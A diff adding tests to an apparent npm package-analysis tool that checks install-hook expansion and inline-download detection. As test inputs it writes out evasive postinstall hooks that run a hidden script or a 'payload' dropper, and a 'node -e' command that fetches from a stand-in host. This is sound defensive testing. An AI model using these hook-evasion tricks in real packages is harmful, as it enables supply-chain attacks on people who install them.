@@ -455,3 +455,29 @@ describe("what only the flag-aware reading adds never displaces what main's read
   });
 });
 
+
+describe("the flag-aware reading's additions, round two", () => {
+  test("a streamed plan with room for one file holds the declared entry, not a target reached through a quoted flag", () => {
+    const enc = new TextEncoder();
+    const file = (path: string, text: string): TarEntry => ({ path, size: enc.encode(text).length, mode: 0o644, data: enc.encode(text) });
+    const body = "module.exports = 1;\n";
+    const manifest = { name: "probe-pkg", version: "1.0.0", main: "index.js", scripts: { postinstall: "npm run '-s' setup", setup: "node lib/hidden.js" } };
+    const plan = planLayers({ manifest, files: [file("lib/hidden.js", body), file("index.js", body)], imports: new Map(), budget: body.length });
+
+    expect([...plan.production]).toEqual(["index.js"]);
+  });
+
+  for (const [cmd, scripts] of [
+    ['npm run "pay\\\nload"', { payload: DROPPER }],
+    ["npm --prefix npm run payload", { payload: DROPPER }],
+  ] as const) {
+    test(`${JSON.stringify(cmd)}: the script npm runs is read`, () => {
+      expect(expandHooks({ scripts: { postinstall: cmd, ...scripts } })[0]?.scripts).toContain("payload");
+    });
+  }
+
+  test("an eval flag after a node option with a value word the table does not list", () => {
+    expect(isInlineDownload("node --unhandled-rejections strict -e \"require('https').get('https://example.invalid/x')\"")).toBe(true);
+  });
+});
+
